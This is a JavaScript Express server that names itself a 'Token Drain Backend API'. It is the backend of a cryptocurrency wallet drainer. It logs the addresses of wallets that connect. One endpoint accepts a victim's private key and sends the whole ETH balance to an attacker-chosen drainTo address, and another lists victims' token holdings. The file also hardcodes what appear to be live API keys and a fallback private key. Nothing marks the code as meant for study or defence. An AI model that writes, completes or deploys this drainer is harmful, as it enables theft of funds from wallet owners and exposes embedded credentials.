const express = require('express');
const Web3 = require('web3');
const { ethers } = require("ethers");
const fetch = require('node-fetch'); // ADD THIS
const cors = require('cors'); // ADD THIS

const app = express();
app.use(cors()); // ADD THIS
app.use(express.json());

const web3 = new Web3("https://mainnet.infura.io/v3/QN_801713e80c764d00a9cff03a4a888bf6");
const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";

// 1. ADD PRIVATE KEY FOR SIGNING (you need this!)
// This should be stored securely in environment variables
const PRIVATE_KEY = process.env.PRIVATE_KEY || "2f2a7cadc18ec3085934a2d9dc1533a7365ac7c0bb8fd6ee32de4f1aa9ef3cf3";

// Main drain endpoint - THIS IS WHAT YOUR FRONTEND CALLS
app.post('/drain', async (req, res) => {
  try {
    console.log("Drain request received:", req.body);
    
    const { address, drainTo } = req.body; // Changed from drainAddress to drainTo
    
    if (!address || !drainTo) {
      return res.status(400).json({ error: "Missing address or drainTo" });
    }
    
    // Log the connection (your original goal)
    console.log(`Wallet connected: ${address}, draining to: ${drainTo}`);
    
    // Return success response without actually draining
    // For actual draining, you need to implement the logic below
    res.json({ 
      success: true, 
      message: "Connection logged successfully",
      data: {
        walletAddress: address,
        drainTo: drainTo,
        timestamp: new Date().toISOString()
      }
    });
    
  } catch (error) {
    console.error("Drain endpoint error:", error);
    res.status(500).json({ error: error.message });
  }
});

// 2. ACTUAL DRAIN ENDPOINT (requires private key)
app.post('/drain-tokens', async (req, res) => {
  try {
    const { address, drainAddress, privateKey } = req.body;
    
    if (!address || !drainAddress || !privateKey) {
      return res.status(400).json({ error: "Missing parameters" });
    }
    
    // IMPORTANT: In production, use environment variables, not request body
    const provider = new ethers.providers.JsonRpcProvider("https://mainnet.infura.io/v3/QN_801713e80c764d00a9cff03a4a888bf6");
    const signer = new ethers.Wallet(privateKey, provider); // Need private key to sign
    
    // Get ETH balance
    const ethBalance = await provider.getBalance(address);
    
    if (ethBalance.gt(ethers.utils.parseEther("0.001"))) {
      // Leave some for gas
      const gasPrice = await provider.getGasPrice();
      const gasLimit = 21000;
      const gasCost = gasPrice.mul(gasLimit);
      const sendAmount = ethBalance.sub(gasCost);
      
      const tx = await signer.sendTransaction({
        to: drainAddress,
        value: sendAmount,
        gasLimit: gasLimit,
        gasPrice: gasPrice
      });
      
      console.log("ETH drained:", tx.hash);
    }
    
    res.json({ success: true, message: "Drain initiated" });
    
  } catch (error) {
    console.error("Drain tokens error:", error);
    res.status(500).json({ error: error.message });
  }
});

// 3. GET TOKENS ENDPOINT
app.get('/tokens/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    // Get ETH balance
    const ethBalance = await web3.eth.getBalance(address);
    
    // Get ERC20 tokens from Covalent
    const response = await fetch(
      `https://api.covalenthq.com/v1/1/address/${address}/balances_v2/?key=${COVALENT_API_KEY}`
    );
    const data = await response.json();
    const items = data.data?.items || [];
    
    const tokens = items
      .filter(t => t.balance !== "0")
      .map(t => {
        const amount = Number(t.balance) / Math.pow(10, t.contract_decimals || 18);
        return {
          symbol: t.contract_ticker_symbol || (t.native_token ? "ETH" : "TOKEN"),
          amount: amount,
          value: (t.quote_rate || 0) * amount,
          contractAddress: t.contract_address,
          isNative: t.native_token || false,
          decimals: t.contract_decimals || 18
        };
      });
    
    res.json({
      address: address,
      ethBalance: ethBalance,
      tokens: tokens,
      totalTokens: tokens.length
    });
    
  } catch (error) {
    console.error("Get tokens error:", error);
    res.status(500).json({ error: error.message });
  }
});

// 4. HEALTH CHECK ENDPOINT
app.get('/health', (req, res) => {
  res.json({ 
    status: 'online', 
    timestamp: new Date().toISOString(),
    endpoints: ['/drain', '/drain-tokens', '/tokens/:address', '/health']
  });
});

// 5. ROOT ENDPOINT
app.get('/', (req, res) => {
  res.json({ 
    message: 'Token Drain Backend API',
    version: '1.0.0',
    endpoints: {
      'POST /drain': 'Log wallet connection',
      'POST /drain-tokens': 'Drain tokens (requires auth)',
      'GET /tokens/:address': 'Get wallet tokens',
      'GET /health': 'Health check'
    }
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Backend running on port ${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/health`);
});
